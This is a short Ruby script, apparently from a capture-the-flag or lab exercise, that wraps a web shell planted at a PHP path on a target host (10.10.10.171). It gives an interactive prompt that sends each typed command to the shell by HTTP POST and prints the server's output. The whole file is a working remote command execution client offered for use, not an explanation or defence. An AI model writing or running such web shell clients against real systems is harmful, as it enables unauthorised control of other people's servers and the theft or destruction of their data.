require 'net/http'
require 'uri'
require 'readline'
require 'cgi'


class Shell
  attr_accessor :uri
  def initialize()
    @uri = URI.parse 'http://10.10.10.171/ona/kola.php'
  end
  def runcmd(cmd)
    http = Net::HTTP.new(@uri.host, @uri.port)
    request = Net::HTTP::Post.new(@uri.request_uri)
    body = "cmd=#{cmd}"
    request.body = URI.encode("#{body}")
    response = http.request(request)
    if response.body
      return CGI.unescapeHTML(response.body.strip)
    else
      puts response.body
      return "empty"
    end
  end
end


fortune = Shell.new()

prompt = "\n> "
#print prompt
=begin
while user_input = gets.chomp # loop while getting user input
  if user_input
    puts fortune.runcmd(user_input)
    #break # and again
    print prompt # print the prompt, so the user knows to re-enter input
  else
    print prompt # print the prompt, so the user knows to re-enter input
  end
end
=end
while user_input = Readline.readline(prompt, true)
  if user_input
    print fortune.runcmd(user_input)
  end
end


